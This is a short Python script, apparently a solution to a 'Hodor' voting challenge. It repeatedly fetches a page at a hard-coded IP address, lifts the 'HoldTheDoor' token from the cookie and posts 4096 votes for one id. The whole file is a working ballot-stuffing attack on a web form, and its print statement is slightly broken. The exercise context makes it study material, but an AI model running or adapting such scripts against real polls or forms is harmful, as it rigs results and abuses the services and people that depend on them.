#!/usr/bin/python3
 
 
"""hodor for level 0"""
import requests

page = "http://158.69.76.135/level1.php/"
for i in range (0, 4096):
	get = requests.get(page)
	cookies = get.cookies
	dictionary = cookies.get_dict()
	key = dictionary.get('HoldTheDoor')
	payloader = {'id': '2780', 'key': key, 'holdthedoor': 'Enviar'}
	result = requests.post(page, data = payloader, cookies = cookies)
	print("Vote n*{:d}")
